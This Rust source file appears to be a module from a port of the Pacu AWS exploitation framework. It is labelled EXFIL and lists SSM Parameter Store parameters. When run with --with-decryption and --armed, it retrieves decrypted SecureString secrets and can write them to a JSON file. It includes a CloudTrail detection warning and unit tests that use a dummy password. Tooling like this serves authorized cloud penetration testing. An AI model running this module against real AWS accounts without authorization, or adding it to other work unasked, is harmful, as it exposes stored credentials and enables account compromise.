//! systemsmanager__download_parameters — download SSM Parameter Store values.
//!
//! Category: EXFIL. Services: ["SSM"].
//!
//! Args:
//!   --path <path>         parameter path prefix (default: "/" for all)
//!   --recursive           recurse into sub-paths (default: true)
//!   --with-decryption     decrypt SecureString values (requires --armed)
//!   --output <filename>   save parameters to JSON file (optional)
//!
//! Default mode (safe): ssm:DescribeParameters — parameter names, types, last_modified.
//! --with-decryption (requires --armed): ssm:GetParametersByPath with WithDecryption=true.
//!
//! Detection note: ssm:GetParametersByPath with WithDecryption=true appears in CloudTrail.

use colored::Colorize;
use comfy_table::{Cell, Table, presets::UTF8_FULL};
use serde::{Deserialize, Serialize};

use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Data structs
// ---------------------------------------------------------------------------

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ParameterMeta {
    pub name: String,
    pub param_type: String,
    pub last_modified: Option<String>,
    pub version: i64,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ParameterValue {
    pub name: String,
    pub param_type: String,
    pub value: String,
    pub version: i64,
}

// ---------------------------------------------------------------------------
// Timestamp helper
// ---------------------------------------------------------------------------

fn smithy_dt_to_string(dt: &aws_sdk_ssm::primitives::DateTime) -> String {
    dt.fmt(aws_sdk_ssm::primitives::DateTimeFormat::DateTime)
        .unwrap_or_else(|_| "<invalid>".to_owned())
}

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let path: &str = args
        .iter()
        .position(|&a| a == "--path")
        .and_then(|i| args.get(i + 1).copied())
        .unwrap_or("/");

    // --recursive defaults to true unless explicitly not passed; we check for
    // "--no-recursive" as a negation but the spec says default true.
    let recursive = !args.contains(&"--no-recursive");

    let with_decryption = args.contains(&"--with-decryption");

    let output_file: Option<&str> = args
        .iter()
        .position(|&a| a == "--output")
        .and_then(|i| args.get(i + 1).copied());

    println!("{}", "systemsmanager__download_parameters".cyan().bold());
    println!(
        "  {}\n",
        "Download SSM Parameter Store values.".yellow()
    );

    // ── Validate armed requirements ────────────────────────────────────────
    if with_decryption && !ctx.armed {
        anyhow::bail!(
            "--with-decryption requires --armed. Pass --armed when starting pacu."
        );
    }

    if with_decryption {
        println!(
            "  {} ssm:GetParametersByPath with WithDecryption=true appears in CloudTrail.",
            "[DETECTION]".red().bold()
        );
    }

    let ssm = aws_sdk_ssm::Client::new(&ctx.sdk_config);

    // ── --with-decryption: fetch actual values ─────────────────────────────
    if with_decryption {
        return fetch_parameter_values(&ssm, path, recursive, output_file).await;
    }

    // ── Default mode: describe parameters (no values) ──────────────────────
    describe_parameters(&ssm, path, recursive).await
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async fn describe_parameters(
    ssm: &aws_sdk_ssm::Client,
    path: &str,
    _recursive: bool,
) -> anyhow::Result<()> {
    println!(
        "  {} Calling ssm:DescribeParameters (no values exposed)...",
        "[INFO]".cyan()
    );

    let mut params: Vec<ParameterMeta> = Vec::new();
    let mut next_token: Option<String> = None;

    loop {
        let mut req = ssm.describe_parameters();
        if let Some(ref tok) = next_token {
            req = req.next_token(tok);
        }

        match req.send().await {
            Ok(resp) => {
                for p in resp.parameters() {
                    let last_mod = p.last_modified_date().map(smithy_dt_to_string);
                    let type_str = p.r#type()
                        .map(|t| t.as_str().to_owned())
                        .unwrap_or_else(|| "String".to_owned());

                    // Filter by path prefix if path != "/"
                    let name = p.name().unwrap_or("<unknown>");
                    if path != "/" && !name.starts_with(path) {
                        continue;
                    }

                    params.push(ParameterMeta {
                        name: name.to_owned(),
                        param_type: type_str,
                        last_modified: last_mod,
                        version: p.version(),
                    });
                }

                next_token = resp.next_token().map(|s| s.to_owned());
                if next_token.is_none() {
                    break;
                }
            }
            Err(e) => {
                eprintln!(
                    "  {} ssm:DescribeParameters failed: {}",
                    "[ERR]".red().bold(),
                    e
                );
                break;
            }
        }
    }

    if params.is_empty() {
        println!(
            "  {} No parameters found (or insufficient permissions).",
            "[INFO]".cyan()
        );
        return Ok(());
    }

    println!(
        "  {} Found {} parameter(s):",
        "[FOUND]".green().bold(),
        params.len()
    );

    let mut table = Table::new();
    table.load_preset(UTF8_FULL);
    table.set_header(vec!["Name", "Type", "Last Modified", "Version"]);

    for p in &params {
        table.add_row(vec![
            Cell::new(&p.name),
            Cell::new(&p.param_type),
            Cell::new(p.last_modified.as_deref().unwrap_or("-")),
            Cell::new(p.version.to_string()),
        ]);
    }

    println!("{table}");

    println!(
        "\n{}",
        "Run with --with-decryption --armed to retrieve decrypted values.".yellow()
    );

    Ok(())
}

async fn fetch_parameter_values(
    ssm: &aws_sdk_ssm::Client,
    path: &str,
    recursive: bool,
    output_file: Option<&str>,
) -> anyhow::Result<()> {
    println!(
        "  {} Calling ssm:GetParametersByPath(Path={}, Recursive={}, WithDecryption=true)...",
        "[EXEC]".red().bold(),
        path.yellow(),
        recursive
    );

    let mut params: Vec<ParameterValue> = Vec::new();
    let mut next_token: Option<String> = None;

    loop {
        let mut req = ssm
            .get_parameters_by_path()
            .path(path)
            .recursive(recursive)
            .with_decryption(true);

        if let Some(ref tok) = next_token {
            req = req.next_token(tok);
        }

        match req.send().await {
            Ok(resp) => {
                for p in resp.parameters() {
                    let type_str = p.r#type()
                        .map(|t| t.as_str().to_owned())
                        .unwrap_or_else(|| "String".to_owned());

                    let value = p.value().unwrap_or("[encrypted]").to_owned();

                    params.push(ParameterValue {
                        name: p.name().unwrap_or("<unknown>").to_owned(),
                        param_type: type_str,
                        value,
                        version: p.version(),
                    });
                }

                next_token = resp.next_token().map(|s| s.to_owned());
                if next_token.is_none() {
                    break;
                }
            }
            Err(e) => {
                eprintln!(
                    "  {} ssm:GetParametersByPath failed: {}",
                    "[ERR]".red().bold(),
                    e
                );
                break;
            }
        }
    }

    if params.is_empty() {
        println!(
            "  {} No parameters found at path '{}'.",
            "[INFO]".cyan(),
            path
        );
        return Ok(());
    }

    println!(
        "  {} Retrieved {} parameter(s):",
        "[OK]".green().bold(),
        params.len()
    );

    let mut table = Table::new();
    table.load_preset(UTF8_FULL);
    table.set_header(vec!["Name", "Type", "Version", "Value"]);

    for p in &params {
        // Truncate long values for display
        let display_val = if p.value.len() > 60 {
            format!("{}...", &p.value[..57])
        } else {
            p.value.clone()
        };

        table.add_row(vec![
            Cell::new(&p.name),
            Cell::new(&p.param_type),
            Cell::new(p.version.to_string()),
            Cell::new(display_val),
        ]);
    }

    println!("{table}");

    // ── Optionally write to file ───────────────────────────────────────────
    if let Some(filename) = output_file {
        let json = serde_json::to_string_pretty(&params)
            .map_err(|e| anyhow::anyhow!("Failed to serialize parameters: {e}"))?;
        std::fs::write(filename, json)
            .map_err(|e| anyhow::anyhow!("Failed to write {filename}: {e}"))?;
        println!(
            "  {} Saved to '{}'",
            "[OK]".green().bold(),
            filename.green()
        );
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "systemsmanager__download_parameters",
            author: "lancer-pacu",
            category: "EXFIL",
            one_liner: "Describe or download SSM Parameter Store values. --with-decryption requires --armed.",
            services: &["SSM"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use super::*;
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "systemsmanager__download_parameters");
        assert!(found, "systemsmanager__download_parameters not found in inventory");
    }

    #[test]
    fn module_category_is_exfil() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "systemsmanager__download_parameters")
            .expect("systemsmanager__download_parameters not found");
        assert_eq!(m.info.category, "EXFIL");
    }

    #[test]
    fn module_services_include_ssm() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "systemsmanager__download_parameters")
            .expect("systemsmanager__download_parameters not found");
        assert!(m.info.services.contains(&"SSM"));
    }

    #[tokio::test]
    async fn with_decryption_without_armed_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &["--with-decryption"]).await;
        assert!(result.is_err(), "expected error when --with-decryption used without --armed");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--armed"),
            "error should mention --armed: {msg}"
        );
    }

    #[tokio::test]
    async fn default_mode_does_not_require_armed() {
        // Default (describe) mode should NOT require --armed.
        // May fail at API call (no credentials) but not at arg-parse.
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // We don't assert Ok() because the API call will fail with no_credentials.
        let _ = super::run(&ctx, &[]).await;
    }

    #[test]
    fn parameter_meta_serde_round_trip() {
        let meta = ParameterMeta {
            name: "/prod/db/host".to_owned(),
            param_type: "String".to_owned(),
            last_modified: Some("2024-01-15T10:00:00Z".to_owned()),
            version: 3,
        };

        let json = serde_json::to_string(&meta).unwrap();
        let back: ParameterMeta = serde_json::from_str(&json).unwrap();

        assert_eq!(back.name, meta.name);
        assert_eq!(back.param_type, meta.param_type);
        assert_eq!(back.last_modified, meta.last_modified);
        assert_eq!(back.version, meta.version);
    }

    #[test]
    fn parameter_value_serde_round_trip() {
        let pv = ParameterValue {
            name: "/prod/db/password".to_owned(),
            param_type: "SecureString".to_owned(),
            value: "s3cr3t-p@ss!".to_owned(),
            version: 1,
        };

        let json = serde_json::to_string(&pv).unwrap();
        let back: ParameterValue = serde_json::from_str(&json).unwrap();

        assert_eq!(back.name, pv.name);
        assert_eq!(back.param_type, pv.param_type);
        assert_eq!(back.value, pv.value);
        assert_eq!(back.version, pv.version);
    }

    #[test]
    fn default_path_is_root() {
        // Verify that path defaults to "/" when --path is not given
        // by simulating the arg-parse logic
        let args: &[&str] = &[];
        let path = args
            .iter()
            .position(|&a| a == "--path")
            .and_then(|i| args.get(i + 1).copied())
            .unwrap_or("/");
        assert_eq!(path, "/");
    }
}
